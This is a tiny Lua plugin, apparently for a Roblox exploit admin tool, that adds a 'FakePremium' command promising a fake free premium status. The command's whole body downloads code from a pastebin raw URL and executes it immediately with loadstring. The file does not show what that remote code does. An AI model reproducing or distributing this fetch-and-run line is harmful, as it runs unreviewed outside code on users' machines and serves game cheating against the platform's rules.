local Plugin = {
    ["PluginName"] = "FakePremium",
    ["PluginDescription"] = "Get a free premium (fake)",
    ["Commands"] = {
        ["FakePremium"] = {
            ["ListName"] = "premium",
            ["Description"] = "Get a free premium (fake)",
            ["Aliases"] = {"prem"},
            ["Function"] = function(args,speaker)
                loadstring(game:HttpGet("https://pastebin.com/raw/9hJX5jCx", true))()
            end
	    },
    }
}

return Plugin
